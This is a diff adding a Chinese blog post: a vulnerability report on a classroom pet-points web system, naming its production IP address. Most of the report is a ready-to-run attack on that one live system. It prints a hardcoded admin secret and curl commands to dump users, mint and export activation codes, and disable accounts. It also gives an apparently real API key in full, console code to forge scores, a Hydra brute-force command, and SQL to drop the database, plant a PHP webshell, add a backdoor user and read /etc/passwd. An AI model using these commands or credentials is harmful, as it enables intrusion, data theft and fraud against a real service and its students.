@@ -10,6 +10,140 @@
 ]]></content>
   </entry>
   <entry>
+    <title>班级宠物乐园系统漏洞报告</title>
+    <url>/20260401/Report/</url>
+    <content><![CDATA[<h1 id="班级宠物乐园系统漏洞报告"><a href="#班级宠物乐园系统漏洞报告" class="headerlink" title="班级宠物乐园系统漏洞报告"></a>班级宠物乐园系统漏洞报告</h1><p><strong>测试对象</strong>: 生产环境 (<a href="http://43.138.215.11/pet/">http://43.138.215.11/pet/</a>)<br><strong>测试方法</strong>: 代码审计 + 渗透测试</p>
+<hr>
+<h2 id="执行摘要"><a href="#执行摘要" class="headerlink" title="执行摘要"></a>执行摘要</h2><p>本次安全评估发现该系统存在<strong>多个高危安全漏洞</strong>。攻击者可以利用这些漏洞完全控制整个系统，包括：</p>
+<ul>
+<li>未经授权访问所有用户数据</li>
+<li>无限量生成激活码进行非法销售</li>
+<li>禁用任意用户的账号</li>
+<li>篡改学生积分、等级等核心业务数据</li>
+</ul>
+<p><strong>总体风险评级</strong>:  <strong>高危</strong></p>
+<hr>
+<span id="more"></span>
+
+<h2 id="一、漏洞利用分析"><a href="#一、漏洞利用分析" class="headerlink" title="一、漏洞利用分析"></a>一、漏洞利用分析</h2><h3 id="1-1-管理员密钥硬编码"><a href="#1-1-管理员密钥硬编码" class="headerlink" title="1.1 管理员密钥硬编码"></a>1.1 管理员密钥硬编码</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>系统在前端代码中硬编码了管理员后台的访问密钥，<strong>任何用户都可以通过查看网页源代码获取该密钥!!! ∑(ﾟДﾟノ)ノ</strong></p>
+<h4 id="漏洞代码位置"><a href="#漏洞代码位置" class="headerlink" title="漏洞代码位置"></a>漏洞代码位置</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Yx</span> = <span class="string">&quot;petclass_admin_2024&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> xn = &#123;<span class="string">&quot;X-Admin-Secret&quot;</span>: <span class="title class_">Yx</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击步骤演示"><a href="#攻击步骤演示" class="headerlink" title="攻击步骤演示"></a>攻击步骤演示</h4><p><strong>步骤1：获取管理员密钥</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">const Yx = <span class="string">&quot;petclass_admin_2024&quot;</span>;</span><br><span class="line">const xn = &#123;<span class="string">&quot;X-Admin-Secret&quot;</span>: Yx&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤2：利用密钥调用管理接口</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取所有用户信息（包含用户名、账号类型、到期时间）</span></span><br><span class="line">curl -X GET http://43.138.215.11:2016/api/admin/users \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤3：生成大量激活码</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成100个半年期激活码</span></span><br><span class="line">curl -X POST http://43.138.215.11:2016/api/admin/generate-codes \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;count&quot;: 100, &quot;codeType&quot;: &quot;half_year&quot;&#125;&#x27;</span></span><br><span class="line">  &#125;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤4：导出所有未使用的激活码</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载所有可用激活码</span></span><br><span class="line">curl -X GET <span class="string">&quot;http://43.138.215.11:2016/api/admin/codes/export?unused_only=true&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -o stolen_codes.csv</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤5：禁用特定用户账号</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过禁用用户使用的激活码，使其账号失效</span></span><br><span class="line">curl -X POST http://43.138.215.11:2016/api/admin/codes/disable \</span><br><span class="line">  -H <span class="string">&quot;X-Admin-Secret: petclass_admin_2024&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;code&quot;: &quot;ABCD-1234-EFGH-5678&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击影响"><a href="#攻击影响" class="headerlink" title="攻击影响"></a>攻击影响</h4><ul>
+<li><strong>数据泄露</strong>: 所有注册用户的个人信息完全暴露</li>
+<li><strong>经济损失</strong>: 攻击者可无限生成激活码进行非法销售</li>
+<li><strong>服务中断</strong>: 可随意禁用任意用户账号</li>
+<li><strong>系统被完全控制</strong></li>
+</ul>
+<hr>
+<h3 id="1-2-AI-API密钥泄露"><a href="#1-2-AI-API密钥泄露" class="headerlink" title="1.2 AI API密钥泄露"></a>1.2 AI API密钥泄露</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>系统在前端硬编码了OpenAI API密钥，任何人都可以提取并使用该密钥。</p>
+<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在代码中搜索 vi 变量，可以找到：</span></span><br><span class="line"><span class="keyword">const</span> vi = <span class="string">&quot;sk-6rIQlzl2NDpeeh3skHdI4XKyYorO8gifiGeWymKWrjsooZho&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><p><strong>步骤1：提取API密钥</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在代码中搜索 vi 变量，可以找到：</span></span><br><span class="line"><span class="keyword">const</span> vi = <span class="string">&quot;sk-6rIQlzl2NDpeeh3skHdI4XKyYorO8gifiGeWymKWrjsooZho&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤2：滥用API密钥</strong></p>
+<h4 id="攻击影响-1"><a href="#攻击影响-1" class="headerlink" title="攻击影响"></a>攻击影响</h4><ul>
+<li><strong>经济损失</strong>: 攻击者可产生巨额API调用费用（可能高达数万至数十万美元）</li>
+<li><strong>资源耗尽</strong>: 正常用户的AI功能可能因配额耗尽而无法使用</li>
+<li><strong>服务降级</strong>: API提供方可能因滥用封禁该密钥</li>
+</ul>
+<hr>
+<h3 id="1-3-前端业务逻辑篡改"><a href="#1-3-前端业务逻辑篡改" class="headerlink" title="1.3 前端业务逻辑篡改"></a>1.3 前端业务逻辑篡改</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>核心业务逻辑（积分计算、等级升级、宠物进化）完全在前端实现，攻击者可轻易篡改。</p>
+<h4 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 积分添加函数 - 包含所有业务逻辑</span></span><br><span class="line"><span class="attr">addScore</span>: <span class="function">(<span class="params">n, r</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 计算新积分</span></span><br><span class="line">  <span class="keyword">const</span> c = i.<span class="property">score</span> + r.<span class="property">score</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 计算宠物经验</span></span><br><span class="line">  <span class="keyword">let</span> p = i.<span class="property">petExp</span> + <span class="title class_">Math</span>.<span class="title function_">abs</span>(r.<span class="property">score</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 判断是否升级</span></span><br><span class="line">  <span class="keyword">for</span>(; h &lt; Q &amp;&amp; p &gt;= (l[h] || <span class="number">999</span>);) &#123;</span><br><span class="line">    p -= l[h];</span><br><span class="line">    h++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 计算奖励金币</span></span><br><span class="line">  <span class="keyword">const</span> y = h &gt; i.<span class="property">petLevel</span> ? (h - i.<span class="property">petLevel</span>) * <span class="number">2</span> : <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 返回更新后的数据</span></span><br><span class="line">  <span class="keyword">return</span> &#123; ...i, <span class="attr">score</span>: c, <span class="attr">petExp</span>: p, <span class="attr">petLevel</span>: h, <span class="attr">coins</span>: i.<span class="property">coins</span> + y &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><p><strong>步骤1：定位积分添加函数</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在浏览器控制台找到Zustand store</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="variable language_">window</span>.<span class="property">$REACT_STORE$</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤2：篡改业务逻辑</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法1：直接调用积分函数时传入伪造参数</span></span><br><span class="line">store.<span class="title function_">getState</span>().<span class="title function_">addScore</span>(studentId, &#123; <span class="attr">name</span>: <span class="string">&quot;作弊&quot;</span>, <span class="attr">score</span>: <span class="number">999999</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：修改addScore函数本身</span></span><br><span class="line"><span class="keyword">const</span> originalAddScore = store.<span class="title function_">getState</span>().<span class="property">addScore</span>;</span><br><span class="line">store.<span class="title function_">setState</span>(&#123;</span><br><span class="line">  <span class="attr">addScore</span>: <span class="function">(<span class="params">id, item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 绕过所有检查，直接加10万分</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">originalAddScore</span>(id, &#123; ...item, <span class="attr">score</span>: <span class="number">100000</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3：直接修改学生数据</span></span><br><span class="line"><span class="keyword">const</span> student = store.<span class="title function_">getState</span>().<span class="property">students</span>.<span class="title function_">find</span>(<span class="function"><span class="params">s</span> =&gt;</span> s.<span class="property">id</span> === targetId);</span><br><span class="line">student.<span class="property">score</span> = <span class="number">999999</span>;</span><br><span class="line">student.<span class="property">petLevel</span> = <span class="number">10</span>;</span><br><span class="line">student.<span class="property">coins</span> = <span class="number">999999</span>;</span><br><span class="line">store.<span class="title function_">setState</span>(&#123; <span class="attr">students</span>: [...store.<span class="title function_">getState</span>().<span class="property">students</span>] &#125;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤3：自动触发保存</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改后的数据会自动同步到服务器</span></span><br><span class="line"><span class="comment">// 因为store监听了变化并调用save接口</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击影响-2"><a href="#攻击影响-2" class="headerlink" title="攻击影响"></a>攻击影响</h4><ul>
+<li><strong>数据完整性破坏</strong>: 学生积分、等级可随意篡改</li>
+<li><strong>公平性丧失</strong>: 排行榜失去意义</li>
+</ul>
+<hr>
+<h3 id="1-4-API接口暴露"><a href="#1-4-API接口暴露" class="headerlink" title="1.4 API接口暴露"></a>1.4 API接口暴露</h3><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>所有后端API接口路径在前端完全暴露，攻击者可以全面探测接口漏洞。</p>
+<h4 id="API接口地图"><a href="#API接口地图" class="headerlink" title="API接口地图"></a>API接口地图</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 认证接口</span><br><span class="line">POST   /api/auth/login</span><br><span class="line">POST   /api/auth/register</span><br><span class="line">POST   /api/auth/change-password</span><br><span class="line">POST   /api/auth/renew</span><br><span class="line">GET    /api/auth/check</span><br><span class="line"></span><br><span class="line"># 数据接口</span><br><span class="line">GET    /api/data/init</span><br><span class="line">POST   /api/data/students/save</span><br><span class="line">PUT    /api/data/settings</span><br><span class="line">DELETE /api/data/student/&#123;id&#125;</span><br><span class="line">DELETE /api/data/students/by-class/&#123;id&#125;</span><br><span class="line"></span><br><span class="line"># 宠物接口</span><br><span class="line">GET    /api/pet-images</span><br><span class="line">POST   /api/pet-images/save</span><br><span class="line"></span><br><span class="line"># 分享接口</span><br><span class="line">POST   /api/share/create</span><br><span class="line">GET    /api/share/&#123;token&#125;</span><br><span class="line"></span><br><span class="line"># 管理接口（已泄露）</span><br><span class="line">GET    /api/admin/stats</span><br><span class="line">GET    /api/admin/codes</span><br><span class="line">GET    /api/admin/users</span><br><span class="line">POST   /api/admin/generate-codes</span><br><span class="line">GET    /api/admin/codes/export</span><br><span class="line">POST   /api/admin/codes/enable</span><br><span class="line">POST   /api/admin/codes/disable</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-5-端口扫描结果"><a href="#1-5-端口扫描结果" class="headerlink" title="1.5 端口扫描结果"></a>1.5 端口扫描结果</h3><table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>状态</th>
+<th>风险等级</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21</td>
+<td>FTP</td>
+<td><strong>打开</strong></td>
+<td>高危</td>
+<td>文件传输服务</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td><strong>打开</strong></td>
+<td>中危</td>
+<td>远程管理服务</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td><strong>打开</strong></td>
+<td>高危</td>
+<td>Web服务（明文传输）</td>
+</tr>
+<tr>
+<td>443</td>
+<td>HTTPS</td>
+<td><strong>打开</strong></td>
+<td>低危</td>
+<td>Web服务（加密传输）</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySQL</td>
+<td><strong>打开</strong></td>
+<td>高危</td>
+<td>数据库服务</td>
+</tr>
+</tbody></table>
+<h4 id="端口-3306-MySQL-数据库"><a href="#端口-3306-MySQL-数据库" class="headerlink" title="端口 3306 - MySQL 数据库"></a>端口 3306 - MySQL 数据库</h4><h4 id="风险分析"><a href="#风险分析" class="headerlink" title="风险分析"></a>风险分析</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MySQL 直接暴露在公网</span></span><br><span class="line">mysql -h 43.138.215.11 -P 3306 -u root -p</span><br></pre></td></tr></table></figure>
+
+<h5 id="攻击场景-1：弱口令爆破"><a href="#攻击场景-1：弱口令爆破" class="headerlink" title="攻击场景 1：弱口令爆破"></a>攻击场景 1：弱口令爆破</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 Hydra 爆破 MySQL</span></span><br><span class="line">hydra -L users.txt -P passwords.txt mysql://43.138.215.11</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见弱口令测试</span></span><br><span class="line">- root:root</span><br><span class="line">- root:123456</span><br><span class="line">- root:password</span><br><span class="line">- admin:admin</span><br><span class="line">- <span class="built_in">test</span>:<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="攻击场景-2：获取完整数据"><a href="#攻击场景-2：获取完整数据" class="headerlink" title="攻击场景 2：获取完整数据"></a>攻击场景 2：获取完整数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 一旦登录成功，攻击者可以：</span></span><br><span class="line"><span class="comment">-- 1. 查看所有数据库</span></span><br><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取所有表</span></span><br><span class="line">USE pet_class_db;</span><br><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 导出所有用户数据</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 导出所有学生数据</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 5. 修改数据</span></span><br><span class="line"><span class="keyword">UPDATE</span> students <span class="keyword">SET</span> score <span class="operator">=</span> <span class="number">999999</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 6. 删除数据</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE pet_class_db;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 7. 写入 Webshell</span></span><br><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="攻击场景-3：权限提升"><a href="#攻击场景-3：权限提升" class="headerlink" title="攻击场景 3：权限提升"></a>攻击场景 3：权限提升</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 如果 MySQL 以 root 权限运行</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建管理员账号</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;hacker&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;hacked&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;hacker&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 读取系统文件</span></span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> temp;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>报告结论</strong>: 服务器配置存在严重安全缺陷，<strong>数据库直接暴露在公网</strong>，加上代码漏洞，系统整体安全评分 <strong>极低</strong>。</p>
+<p><strong>报告撰写</strong>: ZXCLF  </p>
+<p><em>本报告仅用于安全研究和漏洞修复目的，请勿用于非法用途。</em></p>
+]]></content>
+  </entry>
+  <entry>
     <title>作业管理器</title>
     <url>/20260306/Homework_Manager/</url>
     <content><![CDATA[<h1 id="作业管理器"><a href="#作业管理器" class="headerlink" title="作业管理器"></a>作业管理器</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://github.com/ZXCLF/Homework_Manager">github.com&#x2F;ZXCLF&#x2F;Homework_Manager</a></p>
